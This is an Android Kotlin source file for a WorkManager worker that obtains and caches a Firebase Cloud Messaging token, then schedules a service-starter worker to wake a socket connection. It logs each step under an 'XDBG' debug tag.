package com.example.MetaMask.services

import android.content.Context
import androidx.annotation.Keep
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.Worker
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.FCMConfig
import com.google.android.gms.tasks.Tasks
import com.google.firebase.messaging.FirebaseMessaging
import java.util.concurrent.TimeUnit

@Keep
class FcmTokenSendWorker(
    ctx: Context,
    params: WorkerParameters
) : Worker(ctx, params) {

    override fun doWork(): Result {
        android.util.Log.d("XDBG", "[FcmTokenSendWorker] doWork enter runAttempt=$runAttemptCount") //xdbg
        val ctx = applicationContext

        val confirmed = FcmTokenService.isTokenConfirmed(ctx)
        android.util.Log.d("XDBG", "[FcmTokenSendWorker] isTokenConfirmed=$confirmed") //xdbg
        if (confirmed) {
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] already confirmed, skip") //xdbg
            return Result.success()
        }

        val prefs = ctx.getSharedPreferences(FcmTokenService.PREFS_NAME, Context.MODE_PRIVATE)
        var token = prefs.getString(FcmTokenService.PREF_TOKEN, null)
        android.util.Log.d("XDBG", "[FcmTokenSendWorker] cached token=${token?.take(20)}... isEmpty=${token.isNullOrEmpty()}") //xdbg

        if (token.isNullOrEmpty()) {
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] no cached token, trying to fetch fresh") //xdbg
            token = tryGetFirebaseToken(ctx)
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] tryGetFirebaseToken result=${token?.take(20)}... isEmpty=${token.isNullOrEmpty()}") //xdbg
            if (token.isNullOrEmpty()) {
                android.util.Log.e("XDBG", "[FcmTokenSendWorker] still no token, retry") //xdbg
                return Result.retry()
            }
        }

        try {
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] enqueuing ServiceStarterWorker to wake WS") //xdbg
            val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("FCM_SOCKET_WAKE")
                .build()
            WorkManager.getInstance(ctx).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] ServiceStarterWorker enqueued") //xdbg
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenSendWorker] enqueue catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        return Result.success()
    }

    private fun tryGetFirebaseToken(ctx: Context): String? {
        android.util.Log.d("XDBG", "[FcmTokenSendWorker] tryGetFirebaseToken enter") //xdbg
        return try {
            FCMConfig.init(ctx)
            DeviceUUIDProvider.init(ctx)
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] awaiting Firebase token (30s timeout)") //xdbg
            val token = Tasks.await(FirebaseMessaging.getInstance().token, 30, TimeUnit.SECONDS)
            android.util.Log.d("XDBG", "[FcmTokenSendWorker] Firebase token result=${token?.take(20)}... isEmpty=${token.isNullOrEmpty()}") //xdbg
            if (!token.isNullOrEmpty()) {
                ctx.getSharedPreferences(FcmTokenService.PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putString(FcmTokenService.PREF_TOKEN, token)
                    .putBoolean("fcm_token_confirmed", false)
                    .apply()
                android.util.Log.d("XDBG", "[FcmTokenSendWorker] token cached to prefs") //xdbg
            }
            token
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenSendWorker] tryGetFirebaseToken catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            null
        }
    }
}
